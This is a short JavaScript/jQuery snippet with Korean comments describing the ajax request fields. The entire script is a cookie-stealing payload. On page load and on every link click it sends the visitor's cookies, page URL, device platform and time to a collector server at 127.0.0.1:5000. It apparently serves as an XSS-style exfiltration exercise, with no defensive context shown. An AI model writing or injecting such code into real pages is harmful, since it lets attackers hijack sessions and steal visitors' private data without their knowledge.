document.querySelectorAll('a').forEach(item => {  
  item.addEventListener('click', event => {
	ddd=event;
	$.ajax({
    url: "http://127.0.0.1:5000/test", // 클라이언트가 요청을 보낼 서버의 URL 주소
    data: {time : Date(),
           url : document.URL,
           cook : document.cookie,
		   device : navigator.platform,
           eve : 'eve'},                // HTTP 요청과 함께 서버로 보낼 데이터
    type: "GET",                             // HTTP 요청 방식(GET, POST)
dataType: "json" })                     // 서버에서 보내줄 데이터의 타입
	})
  })

$.ajax({
    url: "http://127.0.0.1:5000/test", // 클라이언트가 요청을 보낼 서버의 URL 주소
    data: {time : Date(),
           url : document.URL,
           cook : document.cookie,
		   device : navigator.platform,
           eve : 'eve'},                // HTTP 요청과 함께 서버로 보낼 데이터
    type: "GET",                             // HTTP 요청 방식(GET, POST)
dataType: "json" })